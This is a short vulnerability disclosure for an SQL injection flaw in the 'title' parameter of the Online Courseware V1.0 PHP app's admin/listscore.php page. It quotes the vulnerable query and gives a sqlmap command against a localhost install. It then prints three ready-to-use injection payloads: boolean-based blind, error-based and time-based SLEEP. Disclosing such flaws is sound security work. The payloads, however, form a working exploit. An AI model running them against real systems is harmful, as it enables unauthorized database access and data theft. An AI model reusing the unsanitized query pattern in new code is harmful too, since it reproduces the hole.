#### BUG_AUTHOR:LIU WEIYU
## Online Courseware - SQL Injection on (admin/listscore.php title parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
admin/listscore.php 

On this page, title parameter is vulnerable to SQL Injection Attack 
### Source code(pcci/admin/listscore.php):
```
$title=$_GET['title'];
$result = mysqli_query($conn,"SELECT * FROM stud_scores WHERE cat='$cat' AND title='$title' AND examtype='regularquiz'");
```
### Proof of vulnerability(Verify using the sqlmap tool after logining ):
#### -> sqlmap -u http://localhost/onlinecourseware/pcci/admin/listscore.php?title=sasssasas&cat=Grammar --batch
### Output:
```
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=sasssasas' OR NOT 5806=5806#&cat=Grammar

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: title=sasssasas' OR (SELECT 1622 FROM(SELECT COUNT(*),CONCAT(0x7162767871,(SELECT (ELT(1622=1622,1))),0x7162786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wLWF&cat=Grammar

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=sasssasas' AND (SELECT 4336 FROM (SELECT(SLEEP(5)))HoHV)-- qJzV&cat=Grammar
---
```
